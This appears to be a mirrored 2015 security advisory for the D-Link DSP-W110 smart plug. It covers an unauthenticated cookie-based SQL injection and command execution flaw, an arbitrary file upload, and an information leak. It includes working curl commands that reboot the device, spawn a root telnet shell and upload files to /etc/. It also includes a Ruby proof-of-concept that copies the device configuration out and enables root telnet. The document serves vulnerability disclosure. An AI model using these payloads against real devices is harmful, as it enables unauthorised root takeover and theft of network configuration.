@@ -1,0 +1,229 @@
+id: 23738
+date: 06/12/2015
+title: D-Link DSP-W110 Command Execution / SQL Injection / File Upload Vulnerabilities
+author: Peter Adkins
+cves: 
+
+>> D-Link DSP-W110 - multiple vulnerabilities
+
+----
+Discovered by:
+----
+Peter Adkins <peter.adkins@kernelpicnic.net>
+
+----
+Access:
+----
+Local network; unauthenticated access.
+
+----
+Tracking and identifiers:
+----
+CVE - None allocated.
+
+----
+Platforms / Firmware confirmed affected:
+----
+D-Link DSP-W110 (Rev A) - v1.05b01
+
+----
+Notes:
+----
+* There appears to be a number of references to both 'miiiCasa' as well as
+'fitivision' throughout the firmware, which may indicate that these
+vulnerabilities could be present in other devices not listed in this
+document.
+
+* A copy of this document, as well as the proof of concept below and a
+more detailed write-up has been made available via GitHub:
+
+ * https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110
+
+----
+Arbitrary command execution / SQL Injection
+----
+
+Patches made to lighttpd by the vendor exposes the device to both SQL
+injection, and more interestingly, arbitrary code execution. This is due to
+the improper sanitization of data supplied by a client.
+
+As the lighttpd service provides endpoints to be accessed without
+authentication, it provides a vector for an attacker to execute arbitrary
+commands on the device as the root user via HTTP call without authentication
+credentials.
+
+The root cause of this issue is that the contents of an HTTP Cookie, with
+any name, is passed verbatim to a sprintf() call in order to form an SQL
+query used to validate existing client sessions. By simply performing an
+HTTP request against the device with a correctly formatted cookie set,
+arbitrary SQL can be executed against the internal SQLite database.
+
+Further to this issue, as this SQL query is passed to a popen() call in
+order to execute the query, arbitrary commands are also able to be run on
+the device as the root user.
+
+This said, due to the length of the allocated buffer, the value of the
+cookie cannot exceed 19 characters. However, as below, 19 characters is
+exactly enough to pop a shell on the device.
+
+  # Reboot the device.
+  curl 192.168.1.3/ \
+   --cookie "terribleness='\`reboot\`"
+
+  # Spawn a root shell (telnet)
+  curl 192.168.1.3/ \
+   --cookie "terribleness=\`telnetd -l/bin/sh\`"
+
+----
+Arbitrary file upload
+----
+
+Patches made to lighttpd by the vendor exposes the device to arbitrary file
+upload attacks.
+
+Unfortunately, the only 'filtering' on this resources appears to be a
+sprintf() call which statically prefixes a submitted 'dev' argument with
+'/www'. However, if a HTTP request is performed without a 'dev' argument
+at all, the sprintf() call is never reached, and a fully-qualified path can
+be provided in the 'path' parameter - bypassing the upload path restriction.
+
+As a result of the above, this resource can be used to upload files to
+any location on the filesystem of devices running vulnerable firmware
+versions without authentication.
+
+  # Upload arbitrary files to the device.
+  echo 'Some String' > test.txt
+  curl \
+   -X POST \
+   -i \
+   -F name=@test.txt \
+   --http1.0 \
+   '192.168.1.3/web_cgi.cgi?&request=UploadFile&path=/etc/'
+
+----
+Diagnostic Information
+----
+
+Patches made to lighttpd by the vendor of this device allows an attacker to
+query the device, without authentication, for the following information:
+
+ * Current WLAN SSIDs
+ * Current WLAN channels
+ * LAN and WAN MAC addressing
+ * Current firmware version information
+ * Hardware version information
+
+Although not sensitive information, it may allow for identification of
+devices running vulnerable firmware versions.
+
+  # Information query.
+  curl \
+   192.168.1.3/mplist.txt
+
+----
+Ruby PoC
+----
+
+# DSP-W110-Lighttpd PoC.
+
+require 'pp'
+require 'optparse'
+require 'restclient'
+
+# Set defaults and parse command line arguments
+options = {}
+
+options[:addr] = "192.168.0.60"
+options[:port] = 80
+
+OptionParser.new do |option|
+
+  option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
+    options[:addr] = a
+  end
+
+  option.on("--port [PORT]", "Destination TCP port") do |p|
+    options[:port] = p
+  end
+
+  option.parse!
+
+end
+
+# Define which actions we will be using.
+actions = [
+  {
+    :name => "Get device information",
+    :call => "txt_parser",
+    :path => "mplist.txt",
+  },
+  {
+    :name => "Snatch configuration",
+    :call => "noop",
+    :path => "HNAP1",
+    :cookies => { :cookie => "`cp /etc/co* /www/`" }
+  },
+  {
+    :name => "Fetch configuration",
+    :call => "conf_writer",
+    :path => "config.sqlite",
+  },
+  {
+    :name => "Enable telnet (root)",
+    :call => "noop",
+    :path => "HNAP1",
+    :cookies => { :cookie => "`telnetd -l/bin/sh`" }
+  }
+]
+
+def noop(val)
+  return
+end
+
+def txt_parser(txt)
+  txt.split(/\r?\n/).each do |line|
+    puts "    #{line}"
+  end
+end
+
+def conf_writer(txt)
+  begin
+    f = File.open('./config.sqlite', 'wb')
+  rescue => e
+    puts "[!] Failed to open config.sqlite for writing #{e.message}"
+  end
+  f.write(txt)
+  f.close
+  puts "[*] Configuration fetched into 'config.sqlite'"
+end
+
+# Iterate over all actions and attempt to execute.
+url = "http://#{options[:addr]}:#{options[:port]}"
+
+puts "[!] Attempting to extract information from #{url}"
+
+actions.each do |action|
+
+  # Fire the request and ensure a 200 OKAY.
+  begin
+    response = RestClient.get(
+      "#{url}/#{action[:path]}",
+      {:cookies => action[:cookies]}
+    )
+  rescue
+    puts "[!] Failed to query remote host."
+    abort
+  end
+
+  if response.code != 200
+    puts "[-] '#{action[:name]}' failed with response: #{response.code}"
+    next
+  end
+
+  # Send to the processor.
+  puts "[*] #{action[:name]} request succeeded."
+  send(action[:call], response.body())
+
+end
+
+#  0day.today [2023-03-23]  #
